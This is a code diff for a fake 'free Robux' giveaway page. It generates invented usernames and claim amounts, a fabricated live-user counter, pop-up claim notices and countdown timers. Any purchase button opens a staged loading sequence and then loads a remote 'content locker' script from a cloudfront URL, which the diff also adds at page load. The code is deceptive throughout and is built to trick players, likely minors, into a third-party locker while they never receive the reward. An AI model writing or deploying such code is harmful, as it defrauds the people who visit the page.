@@ -1,11 +1,23 @@
+<script type="text/javascript">
+  var BShtZ_iEt_khrnhc={"it":4146566,"key":"27ad0"};
+</script>
+<script src="https://d3v3431sr9puku.cloudfront.net/0a1f25d.js"></script>
+
+<script>
 (() => {
   const ROBUX_ICON = 'https://images.rbxcdn.com/e854eb7b2951ac03edba9a2681032bba.ico';
-  const triggerLocker = () => {
-  window.BShtZ_iEt_khrnhc = {"it": 4146566, "key": "27ad0"};
-  const s = document.createElement('script');
-  s.src = 'https://d3v3431sr9puku.cloudfront.net/0a1f25d.js';
-  document.body.appendChild(s);
-};
+
+  const showLocker = () => {
+    if (typeof window.BShtZ_iEt_khrnhc_show === 'function') {
+      window.BShtZ_iEt_khrnhc_show();
+    } else if (typeof window.showLocker === 'function') {
+      window.showLocker();
+    } else {
+      const s = document.createElement('script');
+      s.src = 'https://d3v3431sr9puku.cloudfront.net/0a1f25d.js';
+      document.body.appendChild(s);
+    }
+  };
 
   const names = ["PioBlx", "RobloxKing", "NoobMaster69", "Builderman", "GamerGirl99", "ShadowHunter", "EpicLoot", "Vortex", "Zenix", "Krystal"];
   const amounts = ["1,700", "4,500", "10,000", "22,500", "11,000", "24,000"];
@@ -41,7 +53,6 @@
     { amount: "2,000", bonus: "300", price: "Free" }
   ];
 
-  // --------- Render helpers ---------
   const fmtTime = (seconds) => {
     if (seconds <= 0) return '0:00';
     const m = Math.floor(seconds / 60);
@@ -120,7 +131,6 @@
       ans.innerHTML = `<p>${item.a}</p>`;
 
       btn.addEventListener('click', () => {
-        // close others
         [...faqRoot.querySelectorAll('.faq-item')].forEach((el) => {
           if (el !== wrap) el.classList.remove('open');
         });
@@ -133,7 +143,6 @@
     });
   };
 
-  // --------- Live users ticker ---------
   let liveUsers = 8432;
   const liveUsersEl = document.getElementById('liveUsers');
   const updateLiveUsers = () => {
@@ -145,7 +154,6 @@
     liveUsersEl.textContent = liveUsers.toLocaleString();
   };
 
-  // --------- Claim toast ---------
   const toast = document.getElementById('claimToast');
   const toastName = document.getElementById('toastName');
   const toastAmount = document.getElementById('toastAmount');
@@ -166,7 +174,6 @@
     toastTimer = setTimeout(() => { toast.hidden = true; }, 5000);
   };
 
-  // --------- Countdown timers ---------
   const countdowns = Array(4)
     .fill(0)
     .map(() => Math.floor(Math.random() * (300 - 180 + 1)) + 180);
@@ -189,7 +196,6 @@
     });
   };
 
-  // --------- Loading overlay / redirect ---------
   const overlay = document.getElementById('loadingOverlay');
   const progress = document.getElementById('progressBar');
   const msg = document.getElementById('loadingMessage');
@@ -206,27 +212,28 @@
   let loadingInterval = null;
 
   const startLoading = () => {
-  if (loadingInterval) return;
-  overlay.classList.add('show');
-  overlay.setAttribute('aria-hidden', 'false');
-  loadingStep = 0;
-  msg.textContent = loadingMessages[0];
-  progress.style.width = `${(1 / loadingMessages.length) * 100}%`;
+    if (loadingInterval) return;
 
-  loadingInterval = setInterval(() => {
-    loadingStep += 1;
-    if (loadingStep >= loadingMessages.length) {
-      clearInterval(loadingInterval);
-      loadingInterval = null;
-      setTimeout(() => { triggerLocker(); }, 500);
-      return;
-    }
-    msg.textContent = loadingMessages[loadingStep];
-    progress.style.width = `${((loadingStep + 1) / loadingMessages.length) * 100}%`;
-  }, 1500);
-};
+    overlay.classList.add('show');
+    overlay.setAttribute('aria-hidden', 'false');
 
-  // --------- Mount ---------
+    loadingStep = 0;
+    msg.textContent = loadingMessages[0];
+    progress.style.width = `${(1 / loadingMessages.length) * 100}%`;
+
+    loadingInterval = setInterval(() => {
+      loadingStep += 1;
+      if (loadingStep >= loadingMessages.length) {
+        clearInterval(loadingInterval);
+        loadingInterval = null;
+        setTimeout(() => { showLocker(); }, 500);
+        return;
+      }
+      msg.textContent = loadingMessages[loadingStep];
+      progress.style.width = `${((loadingStep + 1) / loadingMessages.length) * 100}%`;
+    }, 1500);
+  };
+
   const bonusGrid = document.getElementById('bonusGrid');
   const mainGrid = document.getElementById('mainGrid');
 
@@ -240,13 +247,12 @@
 
   renderFaq();
 
-  // global purchase buttons
   document.querySelectorAll('[data-action="purchase"]').forEach((btn) => {
     btn.addEventListener('click', startLoading);
   });
 
-  // timers
   setInterval(updateLiveUsers, 3000);
   setInterval(() => showClaim(), 10000);
   setInterval(tickCountdowns, 1000);
 })();
+</script>
